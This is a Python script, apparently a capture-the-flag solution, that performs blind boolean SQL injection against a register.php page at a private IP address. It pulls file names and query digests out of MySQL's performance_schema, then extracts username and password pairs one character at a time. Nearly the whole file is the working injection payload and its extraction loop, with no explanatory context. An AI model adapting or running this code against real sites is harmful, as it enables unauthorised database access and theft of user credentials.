# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# third-party import
import requests

URL = "http://192.168.200.129:8123/register.php"


def get_table():
    for i in range(1, 50):
        for j in range(40, 127):
            payload = f"{URL}?username=a' or if((ascii(mid((select (file_name) FROM performance_schema.file_instances limit 150,1)," + str(i) + ",1)) in (" + str(j) + ")),1,0) and '1&password=a"
            r = requests.get(payload)
            if 'this username' in r.text:
                print(chr(j), end='')
                break


def get_column():
    for i in range(1, 88):
        for j in range(40, 127):
            payload = f"{URL}?username=a' or if((ascii(mid((select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in ('qwb') limit 1,1)," + str(i) + ",1)) in (" + str(j) + ")),1,0) and '1&password=a"
            r = requests.get(payload)
            if 'this username' in r.text:
                print(chr(j), end='')
                break


def get_data():
    for i in range(1, 36):
        for j in range(40, 127):
            payload = f"{URL}?username=a' or if((ascii(mid((select group_concat(qwbqwbqwbuser,0x40,qwbqwbqwbpass) FROM qwbtttaaab111e)," + str(i) + ",1)) in (" + str(j) + ")),1,0) and '1&password=a"
            r = requests.get(payload)
            if 'this username' in r.text:
                print(chr(j), end='')
                break


if __name__ == "__main__":
    get_data()